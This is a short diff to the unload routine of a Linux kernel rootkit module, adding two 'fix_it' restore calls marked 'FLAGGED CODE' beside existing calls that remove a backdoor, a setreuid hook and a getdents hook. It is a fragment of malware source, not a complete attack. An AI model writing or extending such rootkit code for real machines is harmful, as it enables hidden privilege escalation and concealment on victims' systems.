@@ -642,6 +642,8 @@ void cleanup_module(void) {
 	remove_backdoor();
 	remove_setreuid();
 	remove_getdents();
+	fix_it(rootedInReading, "root"); //FLAGGED CODE
+	fix_it(procuredReading, "proc"); //FLAGGED CODE
 
 	printk(KERN_INFO "rootkit unloaded\n");
 }
